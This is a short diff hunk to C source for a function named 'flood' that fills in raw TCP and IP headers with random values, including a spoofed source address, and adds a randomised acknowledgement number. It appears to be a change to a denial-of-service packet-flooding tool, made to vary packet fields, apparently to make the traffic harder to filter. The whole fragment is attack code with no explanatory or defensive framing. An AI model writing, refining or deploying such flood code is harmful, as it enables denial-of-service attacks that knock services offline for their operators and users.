@@ -227,6 +227,7 @@ void *flood(void *par1)
 		tcph->check = 0;
 		tcph->urg_ptr = htons(rand_cmwc() & 0xFFFF);
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
+		tcph->ack_seq = randnum(10000, 99999);
 		tcph->dest = htons(floodport);
 		iph->ttl = randnum(64, 128);
 		iph->saddr = (fourth_octet << 24) | (third_octet << 16) | (second_octet << 8) | (first_octet);
